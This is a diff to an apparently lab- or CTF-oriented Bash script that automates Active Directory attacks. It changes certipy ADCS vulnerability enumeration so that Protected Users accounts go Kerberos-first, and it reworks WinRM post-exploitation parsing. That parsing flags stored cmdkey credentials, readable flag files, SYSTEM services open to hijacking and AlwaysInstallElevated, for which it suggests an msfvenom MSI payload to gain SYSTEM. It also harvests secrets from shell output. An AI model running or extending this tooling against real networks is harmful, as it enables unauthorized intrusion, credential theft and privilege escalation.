@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.31.0"
+readonly VERSION="1.31.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1584,7 +1584,13 @@ phase_adcs() {
     # 52e/57'), and most labs keep NTLM enabled — PREFER password/hash + -target;
     # fall back to Kerberos only when that's all we have or NTLM is refused.
     local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=() cout
-    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
+    # Protected Users can't do NTLM and certipy derives an RC4 Kerberos key from -p
+    # (rejected → 'data 57'), so for those accounts go Kerberos-FIRST with the AES
+    # ccache (now that the per-run krb5.conf realm is correct). This stops us missing
+    # a Protected-Users account's whole ADCS/ESC surface.
+    local _prot=0; [[ "${OWNED_GROUPS[${USER,,}]:-}" == *"Protected Users"* ]] && _prot=1
+    if   [[ "$_prot" == "1" && -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
+    elif [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
@@ -2371,14 +2377,28 @@ _winrm_postex() {
     local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
     _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
     [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
-    grep -qiE 'AlwaysInstallElevated.*0x1' "$out" 2>/dev/null \
-        && loot "★ AlwaysInstallElevated=1 → install an MSI as SYSTEM (msfvenom -f msi)"
-    grep -iE '^\s*(Target|User):' "$out" 2>/dev/null | grep -viE 'NoneType|currently stored' | head -6 \
-        | while read -r l; do info "  cmdkey → $l"; done
-    grep -oiE '[A-Fa-f0-9]{30,32}\b' "$out" 2>/dev/null | head -4 \
-        | while read -r f; do loot "★ flag/secret-looking string in shell output: ${C_GREEN}$f${C_RESET} (winrm_postex)"; done
-    harvest_secrets "winrm-postex" < "$out"
-    loot "WinRM post-ex recon → $(basename "$out")"
+    # Strip ANSI + the evil-winrm banner/prompt/echoed-command so we only inspect
+    # the REAL command output (otherwise our own PowerShell text gets mis-flagged).
+    local clean="$OUTDIR/.winrm_postex_clean.$$"
+    sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' "$out" \
+        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo' >"$clean"
+    # Show each non-empty section inline so the next step is visible, not buried.
+    local sec body
+    for sec in CMDKEY FLAGS AIE SVC TASKS CDRIVE; do
+        body=$(awk "/===${sec}===/{f=1;next} /^===[A-Z]+===/{f=0} f" "$clean" | grep -vE '^[[:space:]]*$')
+        [[ -z "$body" ]] && continue
+        case "$sec" in
+            CMDKEY) [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
+            FLAGS)  loot "★ Flag file(s) readable from this shell:" ;;
+            AIE)    grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
+            SVC)    loot "★ SYSTEM service(s) with binary OUTSIDE system32 (check write perms → privesc):" ;;
+            TASKS)  info "SYSTEM scheduled tasks:" ;;
+            CDRIVE) info "C:\\ top-level (note inetpub=IIS, non-standard dirs):" ;;
+        esac
+        printf '%s\n' "$body" | head -15 | while IFS= read -r l; do detail "      ${l}"; done
+    done
+    rm -f "$clean" 2>/dev/null
+    loot "WinRM post-ex recon saved → $(basename "$out")"
 }
 
 analyze_privileges() {
